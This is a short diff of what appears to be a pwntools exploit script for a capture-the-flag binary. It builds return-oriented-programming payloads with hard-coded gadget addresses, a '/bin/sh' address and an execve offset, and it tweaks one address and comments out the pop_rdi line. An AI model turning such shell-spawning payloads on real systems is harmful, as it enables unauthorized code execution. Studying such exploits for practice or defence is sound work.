@@ -75,7 +75,7 @@ payload += p64(pop_rbx_6) + p64(0xc961a-start_main_offset) + p64(0)*5
 # payload += p64(pop_rbx_6) + p64(execve-start_main_offset) + p64(0)*5
 payload += p64(pop_rbp) + p64(0x3d+0x404758)
 payload += p64(add)
-payload += p64(pop_rbp) + p64(0x404740)
+payload += p64(pop_rbp) + p64(0x404750)
 payload += p64(vuln)
 
 io.sendline(payload)
@@ -87,7 +87,7 @@ binsh = 0x4045f0
 payload = b"1"*0x40+p64(0)
 # payload += p64(pop_rsi_r15)+p64(0)*2
 # payload += p64(ret)
-payload += p64(pop_rdi) + p64(binsh)
+# payload += p64(pop_rdi) + p64(binsh)
 
 io.send(payload)
 
